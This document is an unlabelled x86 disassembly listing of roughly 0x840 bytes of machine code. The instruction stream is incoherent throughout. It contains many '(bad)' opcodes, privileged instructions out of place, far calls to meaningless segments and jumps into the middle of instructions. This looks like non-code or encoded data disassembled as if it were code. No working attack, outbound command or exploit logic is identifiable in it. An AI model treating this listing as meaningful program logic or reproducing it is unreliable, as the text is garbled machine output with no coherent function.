  43241c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432422:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432428:	add    BYTE PTR [esi+0x7d],ah
  43242b:	inc    ebp
  43242c:	mov    bx,WORD PTR [ebp+0x8]
  432430:	add    DWORD PTR [ebp+0x53],0x30c008b
  432437:	inc    ebp
  432438:	mov    bx,di
  43243b:	lock test BYTE PTR [ecx+0x7000801],bh
  432442:	jge    0x432405
  432444:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43244a:	cli    
  43244b:	xor    bl,bh
  43244d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432453:	test   BYTE PTR [eax],cl
  432455:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43245c:	cmp    ebp,eax
  43245e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432465:	test   BYTE PTR [ebp+0x1],bh
  432468:	mov    ebx,0x458a00
  43246d:	xor    esi,DWORD PTR [ebx]
  43246f:	add    esp,DWORD PTR [esi-0x77]
  432472:	pop    ebp
  432473:	loopne 0x4324db
  432475:	inc    ebp
  432476:	clc    
  432477:	xor    edi,DWORD PTR [ebx]
  432479:	add    esi,DWORD PTR [edx-0x77]
  43247c:	data16 fdivr QWORD PTR [ebp-0x49]
  432480:	mov    ebx,0xb78afc
  432485:	hlt    
  432486:	xor    edi,DWORD PTR [edx]
  432488:	data16 add BYTE PTR [ebp+0x66],bl
  43248c:	data16 lock clc 
  43248f:	cmp    bh,BYTE PTR [ebx]
  432491:	add    BYTE PTR [edi+0x66],dh
  432494:	psubq  mm7,QWORD PTR [ebp+0x0]
  432498:	ltr    WORD PTR [ebp+0x66]
  43249c:	add    esi,eax
  43249e:	add    di,WORD PTR [ebp+0x2b]
  4324a2:	data16 data16 jge 0x432523
  4324a6:	mov    ebx,0xe08a8b
  4324ab:	jge    0x4324e0
  4324ad:	data16 data16 xor al,0x5d
  4324b1:	data16 data16 jne 0x4324ad
  4324b5:	mov    edi,DWORD PTR [ebx]
  4324b7:	fdiv   QWORD PTR [edx+0x7d]
  4324ba:	data16 data16 jge 0x4324f2
  4324be:	mov    ebx,0x758a66
  4324c3:	mov    esi,0x667233
  4324c8:	pop    ebp
  4324c9:	or     BYTE PTR [esi+0x0],ah
  4324cc:	clc    
  4324cd:	mov    edi,DWORD PTR [ebx]
  4324cf:	lock ja 0x43245d
  4324d2:	(bad)  
  4324d4:	jge    0x4324cd
  4324d6:	invd   
  4324d8:	pop    ebp
  4324d9:	add    BYTE PTR [ebx],al
  4324db:	(bad)  
  4324dc:	cmp    di,WORD PTR [ebp+0xf]
  4324e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324e4:	mov    bx,WORD PTR [ebp-0x10]
  4324e8:	pop    bp
  4324ea:	fbstp  TBYTE PTR [ebx]
  4324ec:	test   DWORD PTR [ebx],eax
  4324ee:	add    BYTE PTR [ebx],bh
  4324f0:	add    BYTE PTR [esi+0x7d],ah
  4324f3:	jge    0x432480
  4324f5:	data16 in al,dx
  4324f7:	pop    ebp
  4324f8:	stc    
  4324f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432500:	mov    edi,ebx
  432502:	in     al,dx
  432503:	test   BYTE PTR [ebp+0x0],bh
  432506:	mov    eax,DWORD PTR [eax]
  432508:	call   0xbd401e98
  43250d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432513:	sti    
  432514:	call   0x8b4ba2a4
  432519:	add    ebp,esp
  43251b:	mov    bx,di
  43251e:	jnp    0x432546
  432520:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432526:	mov    eax,DWORD PTR [eax]
  432528:	call   0x7c3eb093
  43252d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432533:	data16 data16 fistp WORD PTR [ebp+0xe]
  432538:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432542:	fisttp WORD PTR [ecx-0x7401f77b]
  432548:	(bad)  
  432549:	cld    
  43254a:	jne    0x432586
  43254c:	xor    eax,DWORD PTR [eax]
  43254e:	mov    esp,DWORD PTR [esi-0x10]
  432551:	sti    
  432552:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432559:	data16 adc bl,bh
  43255c:	push   ebp
  43255d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432564:	mov    WORD PTR [eax],es
  432566:	call   0xe48b:0x89fb3266
  43256d:	or     al,0x55
  43256f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432575:	push   cs
  432576:	push   esi
  432577:	mov    bh,0xc8
  432579:	or     al,0x2b
  43257b:	mov    bh,0xba
  43257d:	hlt    
  43257e:	mov    bh,bl
  432580:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432586:	dec    edi
  432587:	or     al,0x0
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	or     BYTE PTR [ebp+0x3b],dh
  43258e:	mov    ecx,DWORD PTR [edi]
  432590:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432596:	xor    al,0xd8
  432598:	pop    bp
  43259a:	lock xor esi,DWORD PTR [ebx]
  43259d:	lea    esp,[esi+0x1f]
  4325a0:	icebp  
  4325a1:	jb     0x4325a7
  4325a3:	add    al,al
  4325a5:	jge    0x4325b3
  4325a7:	mov    eax,eax
  4325a9:	fsubr  st,st(3)
  4325ab:	pop    ebp
  4325ac:	mov    esi,DWORD PTR [ebx]
  4325ae:	in     al,0x8d
  4325b0:	rcr    DWORD PTR [edi],0xc2
  4325b3:	jb     0x432613
  4325b5:	add    cl,cl
  4325b7:	jge    0x4325c5
  4325b9:	mov    edx,DWORD PTR [ebp-0x20]
  4325bc:	in     al,dx
  4325bd:	pop    ebp
  4325be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325c3:	cmp    di,WORD PTR [ebp+0x0]
  4325c7:	mov    ebp,DWORD PTR [ebx]
  4325c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4325cf:	cmp    al,0x33
  4325d1:	mov    si,0x4f7d
  4325d5:	mov    eax,DWORD PTR [eax]
  4325d7:	lock inc ebp
  4325d9:	mov    esi,DWORD PTR [esi]
  4325db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325e2:	clc    
  4325e3:	(bad)  
  4325e4:	cmp    edi,DWORD PTR [ebx]
  4325e6:	je     0x4325f7
  4325e8:	push   ebx
  4325e9:	loopne 0x4325fa
  4325eb:	dec    ecx
  4325ed:	mov    esp,DWORD PTR [esi-0x1c]
  4325f0:	int    0xf1
  4325f2:	mov    esi,0x703084d
  4325f7:	pcmpgtd mm6,mm1
  4325fa:	add    BYTE PTR [ebp+0x66],dh
  4325fd:	jmp    0x4325ca
  4325ff:	mov    eax,DWORD PTR [ebx]
  432601:	lock push ebp
  432603:	ror    DWORD PTR [ebp-0x2972feb3],1
  432609:	or     bh,dl
  43260b:	jb     0x43260b
  43260d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432613:	loopne 0x432615
  432615:	jne    0x432617
  432617:	data16 add BYTE PTR [esi+eiz*2],dh
  43261b:	mov    ecx,ebx
  43261d:	data16 cmp dh,cl
  432620:	add    BYTE PTR [edx],bh
  432622:	data16 add bl,cl
  432625:	data16 cmp dh,dl
  432628:	add    BYTE PTR [edx],bh
  43262a:	data16 add bl,cl
  43262d:	enterw 0x4df1,0x19
  432632:	pop    edi
  432633:	jne    0x4325b6
  432635:	mov    esi,DWORD PTR [esi]
  432637:	call   0x77b7b1d8
  43263c:	xor    ebp,DWORD PTR [ebx]
  43263e:	lea    esp,[esi+0x48]
  432641:	repnz in eax,0x3b
  432644:	add    BYTE PTR [ebp-0x37],dh
  432647:	xor    edx,DWORD PTR [ebp-0x15]
  43264a:	in     al,dx
  43264b:	xor    edx,DWORD PTR [esi+0x40]
  43264e:	mov    DWORD PTR [edi],0x338545fc
  432654:	clc    
  432655:	add    esi,DWORD PTR ds:0xe85b9c5f
  43265b:	ret    0xff
  43265e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432664:	cmp    DWORD PTR [esi+0x45],edx
  432667:	add    BYTE PTR [eax+eax*1+0x61],bh
  43266b:	data16 (bad) 
  43266d:	into   
  43266e:	data16 cmp cl,ch
  432671:	add    BYTE PTR [ecx+0x7ce0866],bh
  432677:	cmp    ah,BYTE PTR [esi+0x0]
  43267a:	add    bh,al
  43267c:	add    ah,bh
  43267e:	add    BYTE PTR [ebp+0x35c3f866],al
  432684:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43268b:	pop    ebp
  43268c:	adc    al,0x57
  43268e:	add    BYTE PTR [edi-0x723c409a],dh
  432694:	add    edi,edi
  432696:	jne    0x4326eb
  432698:	lea    edx,[ecx+0x1]
  43269b:	mov    ebx,0xd64ff1
  4326a0:	sar    DWORD PTR [ebx],1
  4326a2:	test   BYTE PTR [ebp+0x34],dh
  4326a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326a9:	push   edi
  4326aa:	xor    BYTE PTR [ebx],0x39
  4326ad:	mov    esi,ebx
  4326af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4326b5:	xor    al,0x45
  4326b7:	fs pop ebx
  4326b9:	mov    ebx,0x9c3b36
  4326be:	je     0x4326eb
  4326c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4326c6:	mov    WORD PTR [ebx],?
  4326c8:	xor    al,0xbb
  4326ca:	fs dec edi
  4326cc:	mov    eax,DWORD PTR [eax]
  4326ce:	pop    edi
  4326cf:	cmp    ecx,ecx
  4326d1:	jne    0x432728
  4326d3:	mov    ebp,esp
  4326d5:	cld    
  4326d6:	push   esi
  4326d7:	pop    ebx
  4326d8:	inc    ebp
  4326d9:	stc    
  4326da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4326e2:	clc    
  4326e3:	test   dl,dl
  4326e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4326ea:	or     bl,al
  4326ec:	add    BYTE PTR [ebx+0x57665100],cl
  4326f2:	retf   0x3a45
  4326f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4326fd:	clc    
  4326fe:	add    BYTE PTR [ebx+0x66],bl
  432701:	dec    edx
  432703:	mov    edx,DWORD PTR [edi-0x76]
  432706:	push   edi
  432707:	add    al,0xb7
  432709:	xor    al,0xba
  43270b:	cmp    al,0x8d
  43270d:	je     0x43270e
  43270f:	mov    edx,DWORD PTR [ebx-0x46]
  432712:	push   ecx
  432713:	lea    edi,[ebx+0x534fff]
  432719:	push   ecx
  43271a:	cmp    edx,DWORD PTR [ebx+0x75]
  43271d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432723:	add    BYTE PTR [ebx],dh
  432725:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43272b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432732:	mov    ebx,0x3b3b00
  432737:	jne    0x432764
  432739:	mov    DWORD PTR [ebx+0x728afc],edi
  43273f:	xor    esi,DWORD PTR [ebx]
  432741:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432747:	push   edi
  432748:	cmp    esp,ebp
  43274a:	jne    0x43274c
  43274c:	sbb    DWORD PTR [eax],0x8085c3fc
  432752:	clc    
  432753:	inc    ebp
  432754:	pop    ebx
  432755:	sti    
  432756:	add    eax,0xeb8bc075
  43275b:	cld    
  43275c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432762:	mov    ecx,DWORD PTR [ecx+edx*2]
  432765:	rol    DWORD PTR [ebp-0x37],0xf
  432769:	mov    DWORD PTR [eax],ecx
  43276b:	inc    edi
  43276c:	(bad)  
  43276d:	in     eax,0x0
  43276f:	add    bh,bh
  432771:	(bad)  
  432772:	mov    esi,0xc38a5e
  432777:	mov    esi,DWORD PTR [ebx]
  432779:	push   ecx
  43277a:	mov    edi,0xfc4fc7
  43277f:	test   DWORD PTR [ebp-0x8],edx
  432782:	xor    ax,0x9cc7
  432786:	sub    ebp,eax
  432788:	inc    ebp
  432789:	(bad)  
  43278a:	sub    edi,edi
  43278c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432792:	inc    ebp
  432793:	add    BYTE PTR [esi+0x2b],ah
  432796:	or     bh,BYTE PTR [edx+0xf8ac2]
  43279c:	cmp    al,0x33
  43279e:	mov    edi,DWORD PTR [edx+0x4f81]
  4327a4:	(bad)  
  4327a5:	cmp    esi,DWORD PTR [ebx]
  4327a7:	je     0x432761
  4327a9:	push   ebx
  4327aa:	dec    edi
  4327ab:	str    ecx
  4327ae:	cmp    esp,DWORD PTR [esi+0x75]
  4327b1:	int    0x33
  4327b3:	mov    edi,0x789085f
  4327b8:	mov    edx,DWORD PTR [esp+edi*8]
  4327bb:	add    cl,cl
  4327bd:	data16 add al,0xcb
  4327c0:	push   ebp
  4327c1:	add    ebp,esp
  4327c3:	jne    0x4327b1
  4327c5:	(bad)  
  4327c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4327cc:	clc    
  4327cd:	xlat   BYTE PTR ds:[ebx]
  4327ce:	inc    ebp
  4327cf:	mov    esi,DWORD PTR [eax+edx*2]
  4327d2:	pushf  
  4327d3:	in     eax,0x8b
  4327d5:	add    ah,ch
  4327d7:	add    BYTE PTR [ebx+0x0],dl
  4327da:	push   ecx
  4327db:	add    ax,0x72cb
  4327df:	cmp    al,BYTE PTR [eax]
  4327e1:	add    BYTE PTR [ebp+0x66],al
  4327e4:	(bad)  
  4327e5:	retf   
  4327e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4327ed:	retf   
  4327ee:	cmp    eax,ecx
  4327f0:	pushf  
  4327f1:	jge    0x4327ba
  4327f3:	ss cld 
  4327f5:	pushf  
  4327f6:	test   DWORD PTR [edi-0x8],ebx
  4327f9:	je     0x432840
  4327fb:	xor    esi,DWORD PTR ds:0x7020840
  432801:	ror    BYTE PTR [ebp-0x37],0x8d
  432805:	push   ebp
  432806:	add    esp,ebp
  432808:	jb     0x432795
  43280a:	add    BYTE PTR [eax],cl
  43280c:	dec    ebp
  43280d:	mov    bh,0x81
  43280f:	push   esi
  432810:	push   ebx
  432811:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432818:	xor    al,BYTE PTR [eax]
  43281a:	mov    edx,DWORD PTR [edi+0x10]
  43281d:	(bad)  
  43281e:	scas   eax,DWORD PTR es:[edi]
  43281f:	cmp    bh,BYTE PTR [ebx]
  432821:	add    BYTE PTR [edi],cl
  432823:	mov    ebp,ebp
  432825:	cld    
  432826:	add    BYTE PTR [ebx],bh
  432828:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43282c:	dec    ebp
  43282d:	or     BYTE PTR [ebx],ch
  43282f:	ret    0x458b
  432832:	lock jmp 0x432826
  432835:	mov    ecx,DWORD PTR [eax]
  432837:	or     BYTE PTR [edi],al
  432839:	mov    ecx,eax
  43283b:	xor    DWORD PTR [edx+0x2],0x0
  43283f:	mov    bh,0xc1
  432841:	adc    BYTE PTR [eax],dh
  432843:	iret   
  432844:	inc    ebp
  432845:	mov    DWORD PTR [ebx],0x4dfff8c5
  43284b:	inc    BYTE PTR [ebx]
  43284d:	cmp    bh,al
  43284f:	add    BYTE PTR [ecx],dl
  432851:	data16 adc al,bh
  432854:	dec    ecx
  432855:	fisttp WORD PTR [ecx+0x456604c0]
  43285b:	add    dh,BYTE PTR ds:0x75e0845
  432861:	ret    0x4d
  432864:	lea    ecx,[ebx+0x18728301]
  43286a:	add    BYTE PTR [ebp+0x45],al
  43286d:	xor    eax,0xc7009ce9
  432872:	add    al,ch
  432874:	inc    ebp
  432875:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43287b:	xor    eax,0x781084d
  432880:	push   ebx
  432881:	call   0xf89a:0x89813251
  432888:	xor    al,BYTE PTR [ebp+0x3b]
  43288b:	cmp    eax,0xc78b9c76
  432890:	or     ah,dh
  432892:	inc    ebp
  432893:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432899:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43289f:	in     al,dx
  4328a0:	hlt    
  4328a1:	push   ebx
  4328a2:	push   ebx
  4328a3:	push   ecx
  4328a4:	push   ecx
  4328a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328ab:	call   0xe889:0x8b32329a
  4328b2:	clc    
  4328b3:	icebp  
  4328b4:	pop    ebx
  4328b5:	or     BYTE PTR [ebp+0x7],al
  4328b8:	mov    eax,ecx
  4328ba:	clc    
  4328bb:	jb     0x43287e
  4328bd:	add    BYTE PTR [ebp+0x55],cl
  4328c0:	or     DWORD PTR [edi],0xc251d153
  4328c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4328d0:	mov    edi,eax
  4328d2:	or     cl,al
  4328d4:	inc    ebp
  4328d5:	dec    ebp
  4328d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4328dc:	or     WORD PTR [ecx],0x899a
  4328e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4328e7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ea:	mov    eax,DWORD PTR [ebp-0x8]
  4328ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4328f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328fa:	inc    ebp
  4328fb:	dec    eax
  4328fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432902:	add    edx,DWORD PTR [ecx-0x8]
  432905:	mov    ecx,DWORD PTR [ecx]
  432907:	clc    
  432908:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43290f:	mov    ecx,ebp
  432911:	clc    
  432912:	(bad)  
  432913:	popf   
  432914:	inc    DWORD PTR [eax]
  432916:	ret    0x8b
  432919:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43291f:	mov    edi,esp
  432921:	hlt    
  432922:	test   ecx,esi
  432924:	clc    
  432925:	or     BYTE PTR [ebp+0x7],al
  432928:	xor    al,0xc1
  43292a:	pushf  
  43292b:	jb     0x432960
  43292d:	add    BYTE PTR [eax-0x3f],al
  432930:	inc    eax
  432931:	daa    
  432932:	inc    ebp
  432933:	inc    ebp
  432934:	xor    eax,0x7f80803
  432939:	dec    ebp
  43293a:	call   0xc09:0x39f83203
  432941:	or     BYTE PTR [edx],al
  432943:	inc    ebp
  432944:	sub    al,0x35
  432946:	inc    ebp
  432947:	or     BYTE PTR ds:0x74d0807,dh
  43294d:	lea    ebx,[edx-0x748dcdff]
  432953:	add    BYTE PTR [eax*2-0x74b21438],cl
  43295a:	mov    edx,DWORD PTR [eax]
  43295c:	cld    
  43295d:	dec    ebp
  43295e:	push   ebx
  43295f:	sub    edx,DWORD PTR [ecx-0x75]
  432962:	add    eax,0xf172fc
  432967:	or     BYTE PTR [ebp+0x7],cl
  43296a:	add    eax,ecx
  43296c:	or     al,0x72
  43296e:	add    DWORD PTR [eax],eax
  432970:	mov    ebx,0x29c2c1
  432975:	inc    ebp
  432976:	mov    eax,DWORD PTR [ebx]
  432978:	cmp    eax,0x3004d1c
  43297e:	xbegin 0x66c8b578
  432984:	clc    
  432985:	or     BYTE PTR [ebp+0x45],al
  432988:	xor    al,0x35
  43298a:	pushf  
  43298b:	or     BYTE PTR [ebx+0x454d1007],cl
  432991:	lea    eax,[ebp+0x33727501]
  432997:	add    cl,ch
  432999:	inc    ebp
  43299a:	add    bl,ch
  43299c:	add    BYTE PTR [ebx+0x45850845],cl
  4329a2:	je     0x43292f
  4329a4:	push   ebx
  4329a5:	or     al,0x85
  4329a7:	dec    ebp
  4329a8:	std    
  4329a9:	mov    bh,bh
  4329ab:	mov    BYTE PTR [ebp-0x75],al
  4329ae:	mov    edi,eax
  4329b0:	or     al,0x89
  4329b2:	inc    ebp
  4329b3:	clc    
  4329b4:	mov    esp,esp
  4329b6:	hlt    
  4329b7:	call   DWORD PTR [edi-0x37]
  4329ba:	push   ebx
  4329bb:	or     al,0x51
  4329bd:	push   ebp
  4329be:	xor    ebp,esp
  4329c0:	mov    esi,0x457251
  4329c5:	xor    eax,0xc7459cc6
  4329ca:	mov    edi,eax
  4329cc:	or     al,0x85
  4329ce:	add    al,bh
  4329d0:	inc    eax
  4329d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329d6:	or     ah,bh
  4329d8:	inc    eax
  4329d9:	push   ebx
  4329da:	jmp    0x432a2d
  4329dc:	mov    eax,DWORD PTR ds:0xe8720c
  4329e2:	mov    DWORD PTR [ebp-0x8],eax
  4329e5:	jne    0x432a2c
  4329e7:	jmp    0x432974
  4329e9:	mov    ebp,DWORD PTR [eax]
  4329eb:	clc    
  4329ec:	retf   0xff53
  4329ef:	push   ecx
  4329f0:	mov    DWORD PTR ds:0x757210,eax
  4329f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329f9:	sub    esp,DWORD PTR [ebx-0x77]
  4329fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a03:	or     ah,bh
  432a05:	pop    es
  432a06:	ds call 0x8f0:0x8b8b32ff
  432a0e:	(bad)  
  432a0f:	dec    ebp
  432a10:	(bad)  
  432a11:	mov    bh,bh
  432a13:	jmp    0x432a01
  432a15:	leave  
  432a16:	jne    0x432a20
  432a18:	call   0x302372
  432a1d:	in     al,dx
  432a1e:	dec    ebp
  432a1f:	add    dh,BYTE PTR [ebx]
  432a21:	add    BYTE PTR [ebx],al
  432a23:	inc    ebp
  432a24:	cmp    esi,DWORD PTR ds:0xc78b9c74
  432a2a:	or     al,0xf0
  432a2c:	add    BYTE PTR [ebp+0x458bf845],al
  432a32:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a38:	adc    al,0x7
  432a3a:	enter  0x9fc0,0xa5
  432a3e:	rol    BYTE PTR [eax],0x5e
  432a41:	mov    ecx,ecx
  432a43:	or     al,0xc
  432a45:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a4c:	jmp    0x432a4d
  432a4e:	push   ebp
  432a4f:	mov    esp,ebp
  432a51:	cld    
  432a52:	inc    ebp
  432a53:	inc    ebp
  432a54:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a5b:	push   esi
  432a5c:	push   esi
  432a5d:	mov    edi,0x7af080f
  432a62:	add    bh,al
  432a64:	test   DWORD PTR [edx+0x3a7320f],ebx
  432a6a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a70:	mov    ebp,eax
  432a72:	mov    ebp,edi
  432a74:	lock call edx
  432a77:	fcom   DWORD PTR [ebp+0x45]
  432a7a:	mov    eax,0x148a8b
  432a7f:	push   ecx
  432a80:	enter  0xc145,0x83
  432a84:	cmp    ecx,DWORD PTR [eax]
  432a86:	add    BYTE PTR [ebp+0x4d],al
  432a89:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a8f:	call   0xffa325fe
  432a94:	cmp    eax,DWORD PTR [ebp-0xc]
  432a97:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a9b:	push   ebp
  432a9c:	(bad)
  432a9f:	std    
  432aa0:	lock push DWORD PTR [edi+0x5d08fcdb]
  432aa7:	inc    ebp
  432aa8:	(bad)  
  432aa9:	call   0xff7d2739
  432aae:	add    al,BYTE PTR [ebp+0x37]
  432ab1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  432ab7:	jne    0x432ab9
  432ab9:	(bad)  
  432aba:	cmp    edi,esp
  432abc:	jne    0x432aef
  432abe:	mov    edi,edi
  432ac0:	or     BYTE PTR [ebx-0x307f0b49],cl
  432ac6:	pop    ds
  432ac7:	into   
  432ac8:	je     0x432a8b
  432aca:	mov    ebx,DWORD PTR [esi]
  432acc:	or     BYTE PTR [ebp-0x49],al
  432acf:	mov    esp,DWORD PTR [esi-0x77]
  432ad2:	mov    esi,0x451f0c
  432ad7:	mov    eax,DWORD PTR [eax]
  432ad9:	or     al,0x66
  432adb:	sar    bl,0x3b
  432ade:	xor    esi,DWORD PTR [ebp+0x66]
  432ae1:	xor    ecx,edi
  432ae3:	pop    edi
  432ae4:	adc    bl,BYTE PTR [ebx+0x7c]
  432ae7:	ret    0xff
  432aea:	cld    
  432aeb:	inc    ebp
  432aec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432af2:	cld    
  432af3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432afa:	push   0xffffff83
  432afc:	pop    edi
  432afd:	or     BYTE PTR [ebp+0x53],dh
  432b00:	xorps  xmm1,xmm2
  432b03:	test   BYTE PTR [eax+eax*1],bh
  432b06:	add    BYTE PTR [eax],al
  432b08:	adc    eax,eax
  432b0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432b12:	jmp    DWORD PTR [eax]
  432b14:	ror    al,0x5e
  432b17:	inc    ebp
  432b18:	leave  
  432b19:	xor    ecx,DWORD PTR [eax]
  432b1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432b21:	add    ch,al
  432b23:	xor    edi,edi
  432b25:	xor    DWORD PTR [ebx],0x66003300
  432b2b:	mov    DWORD PTR [ebp-0xc],ecx
  432b2e:	pcmpgtw mm0,mm0
  432b31:	add    dl,ah
  432b33:	leave  
  432b34:	mov    edi,DWORD PTR [esi-0x7d]
  432b37:	push   ax
  432b39:	dec    ebp
  432b3a:	mov    esi,DWORD PTR [ebx-0x75]
  432b3d:	lea    ebp,[eax-0x7c010000]
  432b43:	xor    eax,DWORD PTR [eax]
  432b45:	sysret 
  432b47:	dec    ebp
  432b48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b4f:	push   WORD PTR [ecx+0x8]
  432b53:	jne    0x432b16
  432b55:	ud0    ecx,DWORD PTR [ecx]
  432b58:	mov    edi,DWORD PTR [edx]
  432b5a:	lods   al,BYTE PTR ds:[esi]
  432b5b:	add    BYTE PTR [eax],al
  432b5d:	data16 (bad) 
  432b5f:	iret   
  432b60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b67:	cli    
  432b68:	inc    ebp
  432b69:	cmp    al,0x8d
  432b6b:	add    BYTE PTR [esi+0x2d],ah
  432b6e:	inc    ebp
  432b6f:	pop    ebp
  432b70:	lea    ecx,[edi]
  432b72:	mov    dl,bh
  432b74:	add    BYTE PTR [edi],cl
  432b76:	mov    DWORD PTR [eax+eax*8],edi
  432b79:	mov    ebx,0x3b87
  432b7e:	add    BYTE PTR [ebx],ch
  432b80:	inc    ebp
  432b81:	data16 (bad) 
  432b83:	clc    
  432b84:	int3   
  432b85:	cmp    eax,DWORD PTR [eax]
  432b87:	je     0x432b12
  432b89:	push   0xffffffc8
  432b8b:	pop    edi
  432b8c:	xchg   DWORD PTR [ebp+0x0],eax
  432b8f:	data16 add BYTE PTR [ebp+0x45],cl
  432b93:	lea    cx,[ebp+0x10]
  432b97:	jb     0x432b99
  432b99:	jmp    0x432b24
  432b9b:	call   eax
  432b9d:	clc    
  432b9e:	xchg   DWORD PTR [edi+0x1],edi
  432ba1:	mov    eax,DWORD PTR [eax]
  432ba3:	or     BYTE PTR [ebp-0x49],al
  432ba6:	lea    eax,[eax+0x74003154]
  432bac:	push   edi
  432bad:	inc    edx
  432bae:	jge    0x432baf
  432bb0:	mov    DWORD PTR [edi],ecx
  432bb2:	fdiv   DWORD PTR [edi-0x6]
  432bb5:	inc    DWORD PTR [eax]
  432bb7:	xor    edx,DWORD PTR [eax+0x5f]
  432bba:	xchg   DWORD PTR [ebx+0x1],ebx
  432bbd:	ret    0x0
  432bc0:	xor    BYTE PTR [ebp-0x51],cl
  432bc3:	cmp    edi,0xf0ff8900
  432bc9:	data16 ror al,0x84
  432bcd:	rol    BYTE PTR [eax],0x3b
  432bd0:	add    al,dh
  432bd2:	dec    eax
  432bd3:	xchg   esp,eax
  432bd4:	push   ebx
  432bd5:	jmp    0x432b62
  432bd7:	push   ebp
  432bd8:	add    esp,ebp
  432bda:	add    ebp,esp
  432bdc:	mov    edx,DWORD PTR [edi+0x24]
  432bdf:	clc    
  432be0:	dec    esi
  432be1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432be7:	cmp    BYTE PTR [ebx],al
  432be9:	jne    0x432b74
  432beb:	xor    esp,eax
  432bed:	jmp    0x462d70
  432bf2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bf5:	jne    0x432beb
  432bf7:	call   0xffcd2951
  432bfc:	clc    
  432bfd:	xchg   edi,eax
  432bfe:	sti    
  432bff:	add    DWORD PTR [ebx],eax
  432c01:	add    BYTE PTR [ebp+0x47],bl
  432c04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c0a:	pop    ebp
  432c0b:	mov    DWORD PTR [esi-0x48],esi
  432c0e:	jmp    0x432c57
  432c10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c16:	(bad)  
  432c18:	cmp    al,0x0
  432c1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432c1d:	lea    ebx,[ebp-0x56]
  432c20:	jle    0x432c22
  432c22:	jae    0x432bad
  432c24:	mov    eax,esp
  432c26:	call   0xb900:0x8b005587
  432c2d:	inc    ebp
  432c2e:	push   ebp
  432c2f:	lea    ecx,[ebp-0x27ff4f12]
  432c35:	mov    eax,edi
  432c37:	int3   
  432c38:	push   ebp
  432c39:	xchg   edi,eax
  432c3b:	add    esp,ebp
  432c3d:	add    BYTE PTR [eax],al
  432c3f:	inc    ebp
  432c40:	add    BYTE PTR [ebp+0x8b3255],cl
  432c46:	cld    
  432c47:	mov    DWORD PTR [edx],edi
  432c49:	aam    0x75
  432c4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c51:	mov    DWORD PTR [ebx-0x50],edx
  432c54:	test   BYTE PTR [ebp-0x1],0xe8
  432c58:	mov    eax,DWORD PTR [eax]
  432c5a:	hlt    
